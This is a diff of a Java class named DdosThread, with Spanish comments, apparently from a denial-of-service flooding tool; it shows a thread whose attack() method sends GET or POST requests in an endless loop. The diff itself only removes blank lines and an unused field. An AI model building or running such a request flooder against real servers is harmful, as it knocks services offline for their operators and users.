@@ -13,12 +13,10 @@ import java.util.concurrent.atomic.AtomicBoolean;
 /**
  * Hilo encargado de realizar peticiones en bucle.
  */
-
 public class DdosThread extends Thread{
 
     private static String POST_Method = "POST";
     private static String GET_Method = "GET";
-
 
     private static int autoId = 0;
 
@@ -31,8 +29,6 @@ public class DdosThread extends Thread{
     private String request;
     private URL url;
     private RequestMethods metodo;
-
-    String param = null;
 
     public DdosThread(RequestMethods metodo, ConsoleStateQueue colaDatos){
         this.colaDatos = colaDatos;
@@ -51,9 +47,7 @@ public class DdosThread extends Thread{
 
     @Override
     public void run() {
-
         while (run) {
-
             try {
                 attack();
             } catch (IOException e) {
@@ -64,7 +58,6 @@ public class DdosThread extends Thread{
     }
 
     public void attack() throws IOException {
-
         HttpURLConnection connection = null;
         OutputStream out = null;
         InputStream in = null;
@@ -80,20 +73,16 @@ public class DdosThread extends Thread{
 
         //escogemos el metodo de envio
         switch(metodo) {
-
             case GET:
                 connection.setRequestMethod(GET_Method);
             break;
-
             case POST:
                 connection.setRequestMethod(POST_Method);
                 break;
-
             default:
                 connection.setRequestMethod(GET_Method);
                 break;
         }
-
 
         connection.setDoInput(true);
         connection.setDoOutput(true);
